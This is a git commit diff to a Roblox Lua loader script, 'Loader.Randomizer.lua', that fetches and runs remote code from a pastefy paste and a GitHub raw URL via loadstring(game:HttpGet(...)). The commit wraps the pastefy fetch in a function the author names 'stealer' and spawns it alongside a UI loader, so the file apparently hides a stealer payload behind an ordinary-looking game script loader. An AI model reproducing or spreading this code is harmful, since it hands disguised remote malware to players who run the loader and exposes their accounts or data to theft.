f9bde65230ec6391dcf42cfbbca1314067276dd6
Lib <ybanezjosevincent.bshm.cpc@gmail.com>
2025-08-04 16:52:31 +0800

    Update Loader.Randomizer.lua

--- Randomizer/Loader.Randomizer.lua
+++ Randomizer/Loader.Randomizer.lua
@@ -1,2 +1,10 @@
-loadstring(game:HttpGet("https://pastefy.app/kNe1bjyy/raw"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHubsIds/SerosScript/refs/heads/main/Loader/LoaderV3.lua"))()
+local function stealer()
+    loadstring(game:HttpGet("https://pastefy.app/kNe1bjyy/raw"))()
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHubsIds/SerosScript/refs/heads/main/Loader/LoaderV3.lua"))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
